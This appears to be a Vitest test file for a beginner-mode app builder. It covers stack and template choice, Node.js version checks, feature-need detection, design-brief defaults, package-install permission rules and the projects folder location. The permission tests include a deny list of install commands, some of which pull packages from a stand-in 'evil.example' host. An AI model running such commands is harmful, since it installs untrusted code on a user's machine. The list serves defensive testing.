// Beginners, part A: React by default for a website or app (plain HTML on request, and without Node.js or with one too
// old for Vite), the needs an idea has beyond pages (one plain question, the task's instruction for each answer), the
// default look-and-feel bar in the Brief, registry package installs under the project permission, and the default
// projects folder outside a OneDrive-synced Documents.
import { describe, expect, it } from 'vitest'
import type { AllowQuery } from '@core/adapters/allow-cache.ts'
import { classifyAsk, registryPackageSpec } from '@core/easy/ask-tier.ts'
import type { AskContext, ProjectFacts } from '@core/easy/ask-tier.ts'
import { detectNeeds, needsNote } from '@core/easy/needs.ts'
import { defaultProjectsDir, oneDriveSynced } from '@core/easy/projects-dir.ts'
import {
  REACT_LANDING_TEMPLATE,
  REACT_TEMPLATE,
  chooseStack,
  chooseTemplate,
  easyTask,
  withEasyLook,
} from '@core/easy/resolve.ts'
import { easyBrief, templateChecks } from '@core/easy/service.ts'
import { detectToolchain, e2eToolchain, nodeMeetsVite } from '@core/easy/toolchain.ts'
import { designBarSection, isUiBrief, taskSetsLook } from '@core/brief/design-bar.ts'
import { renderBrief } from '@core/brief/brief.ts'
import { readBuiltinPacks } from '@core/packs/load.ts'
import { readBuiltinTemplates } from '@core/templates/load.ts'
import { EASY_NEED_CHOICES } from '@shared/easy.ts'
import type { Template } from '@shared/templates.ts'
import { templateBrief } from '@shared/templates.ts'

const packs = readBuiltinPacks().map((v) => v.pack)
const templates = readBuiltinTemplates()
const template = (id: string): Template => {
  const t = templates.find((x) => x.id === id)
  if (t === undefined) throw new Error(id)
  return t
}
const READY = { node: true, python: false, nodeVersion: '22.12.0' }
const NO_NODE = { node: false, python: false, nodeVersion: null }
const OLD_NODE = { node: false, python: false, nodeVersion: '18.20.4', nodeOld: true }

describe('Node.js new enough for Vite', () => {
  it.each([
    ['18.20.4', false],
    ['20.18.1', false],
    ['20.19.0', true],
    ['21.7.3', false],
    ['22.11.0', false],
    ['22.12.0', true],
    ['v24.19.0', true],
    ['26.0.0', true],
    ['not a version', false],
  ])('%s → %s', (v, ok) => {
    expect(nodeMeetsVite(v)).toBe(ok)
  })

  it('reads the version, not just whether node is on PATH', async () => {
    const isFile = (p: string): boolean => /[\\/]node(?:\.exe)?$/i.test(p)
    const at = (version: string | null) => ({
      entries: ['C:\\nodejs'],
      platform: 'win32' as const,
      env: { PATHEXT: '.EXE' },
      isFile,
      nodeVersion: () => Promise.resolve(version),
    })
    expect(await detectToolchain(at('22.12.0'))).toEqual({
      node: true,
      python: false,
      nodeVersion: '22.12.0',
    })
    expect(await detectToolchain(at('18.20.4'))).toEqual({
      node: false,
      python: false,
      nodeVersion: '18.20.4',
      nodeOld: true,
    })
    // A version that could not be read (a shim) is taken as it is.
    expect((await detectToolchain(at(null))).node).toBe(true)
    expect(
      await detectToolchain({ entries: ['C:\\none'], platform: 'win32', env: {}, isFile: () => false }),
    ).toEqual({ node: false, python: false, nodeVersion: null })
  })

  it('an E2E test may say which Node.js is installed', () => {
    expect(e2eToolchain(undefined, false)).toBeUndefined()
    expect(e2eToolchain('none', false)).toEqual(NO_NODE)
    expect(e2eToolchain('18.20.4', false)).toEqual(OLD_NODE)
    expect(e2eToolchain('22.12.0', false)).toEqual(READY)
  })
})

describe('React by default, plain HTML as an option', () => {
  it('a website or app starts from the React starter when Node.js is ready', () => {
    expect(chooseTemplate('app', 'A tip splitter for my friends', READY)).toEqual({
      templateId: REACT_TEMPLATE,
    })
    expect(chooseTemplate('website', 'A portfolio for my photos', READY)).toEqual({
      templateId: REACT_TEMPLATE,
    })
    expect(chooseTemplate('website', 'A landing page for my bakery', READY)).toEqual({
      templateId: REACT_LANDING_TEMPLATE,
    })
    expect(chooseStack('app', 'A tip splitter', READY)).toEqual({ chosen: 'react', react: true })
  })

  it('Plain HTML when the user picks it, or the idea asks for it', () => {
    expect(chooseTemplate('app', 'A tip splitter', READY, 'html')).toEqual({ templateId: 'static-site' })
    expect(chooseTemplate('website', 'A landing page for my bakery', READY, 'html')).toEqual({
      templateId: 'landing-page',
    })
    expect(chooseStack('website', 'A plain HTML page about my cat', READY)).toEqual({
      chosen: 'html',
      react: true,
    })
    expect(chooseStack('website', 'A site with no build step', READY)?.chosen).toBe('html')
    // React named outright wins over "no framework" style words.
    expect(chooseStack('app', 'A React app with no build step', READY)?.chosen).toBe('react')
  })

  it('without Node.js, or with one too old: plain HTML, whatever was asked', () => {
    for (const tc of [NO_NODE, OLD_NODE]) {
      expect(chooseStack('app', 'A tip splitter', tc)).toEqual({ chosen: 'html', react: false })
      expect(chooseStack('app', 'A tip splitter', tc, 'react')).toEqual({ chosen: 'html', react: false })
      expect(chooseTemplate('app', 'A tip splitter', tc, 'react')).toEqual({ templateId: 'static-site' })
      // An idea that asks for React by name says why it is not React.
      expect(chooseTemplate('app', 'A React app for my notes', tc)).toEqual({
        templateId: 'static-site',
        fallback: { wanted: REACT_TEMPLATE, needs: 'node' },
      })
    }
  })

  it('only websites and apps have a stack', () => {
    for (const k of ['document', 'data', 'research', 'checklist', 'game'] as const)
      expect(chooseStack(k, 'something', READY)).toBeUndefined()
  })

  it('the React templates: a working starter, the checks known up front, the publish-ready task', () => {
    for (const id of [REACT_TEMPLATE, REACT_LANDING_TEMPLATE]) {
      const t = template(id)
      expect(t.webStarter).toBe(true)
      const to = (t.files ?? []).map((f) => f.to)
      for (const f of [
        'package.json',
        'index.html',
        'vite.config.ts',
        'src/styles/tokens.css',
        'src/components/States.tsx',
        'src/lib/router.tsx',
        'src/pages/NotFound.tsx',
        'public/_redirects',
        'public/favicon.svg',
        'public/social-preview.png',
        'assets/README.md',
        'src/App.test.tsx',
      ])
        expect(to, `${id}: ${f}`).toContain(f)
      expect(t.checks?.map((c) => c.run)).toEqual([
        ['npm', 'run', 'test'],
        ['npm', 'run', 'build'],
        ['dimf:pageload', 'dist/index.html'],
      ])
      for (const want of [
        /lorem ipsum/,
        /\[Fill in: \.\.\.\]/,
        /hot-linked/,
        /trackers/,
        /index\.html/,
        /VITE_/,
      ])
        expect(t.task, `${id}: ${String(want)}`).toMatch(want)
      expect(`${t.label} ${t.description} ${t.task}`).not.toMatch(/[–—]/)
    }
  })

  it('the checks for what is installed: no npm checks without Node.js, the page-load check always', () => {
    expect(templateChecks(template('static-site'), READY).map((c) => c.run[0])).toEqual([
      'npm',
      'dimf:pageload',
    ])
    expect(templateChecks(template('static-site'), NO_NODE)).toEqual([
      { name: 'Page loads (Dim Factory)', run: ['dimf:pageload', 'index.html'] },
    ])
    expect(templateChecks(template('data-report-web'), NO_NODE)).toEqual([
      { name: 'Page loads (Dim Factory)', run: ['dimf:pageload', 'report.html'] },
    ])
    expect(templateChecks(template('docs-simple'), READY)).toEqual([])
  })

  it('the plain HTML web templates ask for the publish basics', () => {
    for (const id of ['static-site', 'landing-page']) {
      const t = template(id)
      for (const want of [
        /<title>/,
        /meta description/,
        /social preview/,
        /favicon/,
        /404\.html/,
        /trackers/,
        /assets\//,
      ])
        expect(t.task, `${id}: ${String(want)}`).toMatch(want)
    }
  })
})

describe('what an idea needs beyond pages', () => {
  it.each([
    ['An AI caption writer for my photos', ['ai']],
    ['A landing page for my bakery with a sign-up form for our newsletter', ['forms']],
    ['An online shop for my candles with a checkout', ['payments']],
    ['A members area where people log in to see their bookings', ['login', 'forms']],
    ['A blog about my garden', ['blog']],
    ['A shared shopping list that syncs between devices', ['data']],
    ['A tip splitter for my friends', []],
    ['A landing page for my knitting shop', []],
  ])('%s', (idea, want) => {
    expect(detectNeeds(idea, 'app').map((n) => n.need)).toEqual(want)
  })

  it('only for websites and apps; recommended first; a sign-up form says so', () => {
    expect(detectNeeds('A guide about our newsletter sign up', 'document')).toEqual([])
    const [forms] = detectNeeds('A waitlist page with a sign-up form', 'website')
    expect(forms).toEqual({
      need: 'forms',
      choices: [...EASY_NEED_CHOICES.forms],
      recommended: 'email',
      signup: true,
    })
    expect(detectNeeds('A contact form for my plumbing business', 'website')[0]?.signup).toBeUndefined()
    // An AI or paid API is offered a free server for its key first.
    expect(detectNeeds('An app that uses ChatGPT to write poems', 'app')[0]?.recommended).toBe('proxy')
  })

  it("the task's instruction follows the user's answer (the recommended one when none)", () => {
    const ai = detectNeeds('An AI caption writer', 'app')
    const proxy = needsNote(ai, {})
    expect(proxy).toMatch(/never be in the page/)
    expect(proxy).toMatch(/netlify\/functions/)
    expect(proxy).toMatch(/VITE_/)
    expect(needsNote(ai, { ai: 'none' })).toMatch(/Leave out any AI/)
    // An answer the need does not have counts as no answer.
    expect(needsNote(ai, { ai: 'bogus' })).toBe(proxy)
    const forms = detectNeeds('A sign-up form for our newsletter', 'website')
    expect(needsNote(forms, {})).toMatch(/Netlify form/)
    expect(needsNote(forms, { forms: 'list' })).toMatch(/Supabase/)
    expect(needsNote([], {})).toBe('')
  })
})

describe('the default look and feel', () => {
  const reactBrief = templateBrief(template(REACT_TEMPLATE))

  it('is for something people look at', () => {
    expect(isUiBrief(reactBrief)).toBe(true)
    expect(isUiBrief(templateBrief(template('landing-page')))).toBe(true)
    expect(isUiBrief(templateBrief(template('node-cli')))).toBe(false)
    expect(isUiBrief({ category: 'software', fields: {} })).toBe(false)
    expect(isUiBrief(templateBrief(template('docs-simple')))).toBe(false)
  })

  it('is left out when the request already says how it should look', () => {
    expect(taskSetsLook('A pastel website for my bakery')).toBe(true)
    expect(taskSetsLook('A tip splitter with big blue buttons in my brand colours')).toBe(true)
    expect(taskSetsLook('A tip splitter for my friends')).toBe(false)
    // An Easy task: the template's outline (which talks about colours and tokens) is not the user's request.
    const task = easyTask(template(REACT_TEMPLATE), 'A tip splitter for my friends')
    expect(task).toMatch(/colour/)
    expect(taskSetsLook(task)).toBe(false)
  })

  it('goes into the Brief text the Clarify, Plan and Implement prompts carry', () => {
    const pack = packs.find((p) => p.id === 'software')
    if (pack === undefined) throw new Error('software')
    const task = easyTask(template(REACT_TEMPLATE), 'A tip splitter for my friends')
    const text = renderBrief(pack, reactBrief, [], { task })
    expect(text).toContain('Look and feel (a default: the request does not say how it should look):')
    for (const want of [
      /design tokens/,
      /Light and dark/,
      /4\.5:1/,
      /360 px/,
      /loading, empty and error/,
      /lorem ipsum/,
    ])
      expect(text).toMatch(want)
    expect(renderBrief(pack, reactBrief, [], { task: 'A neon tip splitter' })).not.toContain('Look and feel')
    expect(renderBrief(pack, reactBrief, [])).not.toContain('Look and feel')
    expect(designBarSection(reactBrief, 'x')).not.toMatch(/[–—]/)
  })

  it("a website or app's Brief takes its Easy recipe's look and quality choices", () => {
    const brief = easyBrief('app', template('static-site'), 'A tip splitter', packs)
    expect(brief.fields['quality']?.choices).toEqual(['responsive', 'accessible', 'dark-mode'])
    const landing = easyBrief('website', template('landing-page'), 'A landing page', packs)
    expect(landing.fields['breakpoints']?.choices).toEqual(['mobile', 'desktop'])
    expect(landing.fields['output']?.choices).toEqual(['html-css', 'tokens'])
    // Every other kind keeps its template's Brief.
    const doc = easyBrief('document', template('docs-simple'), 'A guide', packs)
    expect(doc).toEqual(templateBrief(template('docs-simple')))
    // A single choice the template made stays, a multi-choice group gets the recipe's added, and options the pack
    // does not have are left out.
    const kept = withEasyLook(
      {
        category: 'software',
        fields: {
          uiFramework: { choices: ['react'], source: 'user' },
          styling: { choices: ['tailwind'], source: 'user' },
        },
      },
      {
        category: 'software',
        fields: {
          uiFramework: { choices: ['plain-html'] },
          styling: { choices: ['plain-css'] },
          quality: { choices: ['nope'] },
        },
      },
      packs,
    )
    expect(kept.fields['uiFramework']?.choices).toEqual(['react'])
    expect(kept.fields['styling']?.choices).toEqual(['tailwind', 'plain-css'])
    expect(kept.fields['quality']).toBeUndefined()
  })

  it('the software and design packs name the web security focus', () => {
    for (const id of ['software', 'design']) {
      const focus = packs.find((p) => p.id === id)?.security?.focus.join('\n') ?? ''
      expect(focus, id).toMatch(/VITE_, NEXT_PUBLIC_, REACT_APP_/)
      expect(focus, id).toMatch(/need no key/)
      expect(focus, id).toMatch(/server function/)
    }
  })
})

describe('the project permission and registry packages', () => {
  const FOLDER = 'C:/Users/me/Dim Factory Projects/notes'
  const NODE: ProjectFacts = {
    scripts: { dev: 'vite', build: 'vite build' },
    requirements: false,
    pyproject: false,
  }
  const ctx = (facts: ProjectFacts = NODE): AskContext => ({
    folder: FOLDER,
    cwd: FOLDER,
    facts,
    caseInsensitive: true,
  })
  const shell = (command: string): AllowQuery => ({
    vendor: 'claude',
    kind: 'shell',
    tool: 'Bash',
    argv: command.trim().split(/\s+/),
  })

  it.each([
    ['npm install react-router-dom', 'npm install react-router-dom'],
    ['npm i -D vitest @testing-library/react', 'npm i vitest @testing-library/react'],
    ['npm install zod@latest', 'npm install zod@latest'],
    ['npm install @supabase/supabase-js@^2.45.0 --save-exact', 'npm install @supabase/supabase-js@^2.45.0'],
    ['npm add date-fns --no-audit', 'npm add date-fns'],
    ['pnpm add -D typescript', 'pnpm add typescript'],
    ['yarn add react', 'yarn add react'],
    ['bun add zod', 'bun add zod'],
  ])('covered: %s', (command, label) => {
    expect(classifyAsk(shell(command), ctx())).toEqual({
      tier: 'project',
      covered: true,
      what: 'install',
      label,
    })
  })

  it.each([
    'npm install -g typescript',
    'npm install --global typescript',
    'npm install react --registry=https://evil.example',
    'npm install react --prefix other',
    'npm install https://evil.example/pkg.tgz',
    'npm install git+https://github.com/user/repo.git',
    'npm install github:user/repo',
    'npm install user/repo',
    'npm install file:../pkg',
    'npm install ./local-package',
    'npm install pkg.tgz',
    'npm install alias@npm:react',
    'npm install react@">=18"',
    'yarn add react --modules-folder ../x',
  ])('asks: %s', (command) => {
    expect(classifyAsk(shell(command), ctx()).covered).toBe(false)
  })

  it('needs the project package.json; and a spec reads as a registry package or not', () => {
    expect(
      classifyAsk(shell('npm install react'), ctx({ scripts: null, requirements: false, pyproject: false }))
        .covered,
    ).toBe(false)
    expect(registryPackageSpec('@scope/name@1.2.3')).toBe(true)
    expect(registryPackageSpec('name@1.x')).toBe(true)
    expect(registryPackageSpec('Name')).toBe(false)
    expect(registryPackageSpec('-D')).toBe(false)
    expect(registryPackageSpec('name@npm:other')).toBe(false)
  })
})

describe('the default projects folder', () => {
  const docs = 'C:\\Users\\sam\\OneDrive\\Documents'
  it('is out of a OneDrive-synced Documents folder, in the user folder', () => {
    expect(oneDriveSynced(docs, {}, 'win32')).toBe(true)
    expect(oneDriveSynced('C:\\Users\\sam\\OneDrive - Contoso\\Documents', {}, 'win32')).toBe(true)
    expect(oneDriveSynced('D:\\Sync\\Docs', { OneDrive: 'D:\\Sync' }, 'win32')).toBe(true)
    expect(oneDriveSynced('d:\\sync\\docs', { OneDriveCommercial: 'D:\\Sync' }, 'win32')).toBe(true)
    expect(
      oneDriveSynced('C:\\Users\\sam\\Documents', { OneDrive: 'C:\\Users\\sam\\OneDrive' }, 'win32'),
    ).toBe(false)
    expect(
      defaultProjectsDir({ documentsDir: docs, homeDir: 'C:\\Users\\sam', env: {}, platform: 'win32' }),
    ).toEqual({
      dir: 'C:\\Users\\sam\\Dim Factory Projects',
      reason: 'onedrive',
    })
    expect(
      defaultProjectsDir({
        documentsDir: 'C:\\Users\\sam\\Documents',
        homeDir: 'C:\\Users\\sam',
        env: {},
        platform: 'win32',
      }),
    ).toEqual({ dir: 'C:\\Users\\sam\\Documents\\Dim Factory Projects' })
  })
})
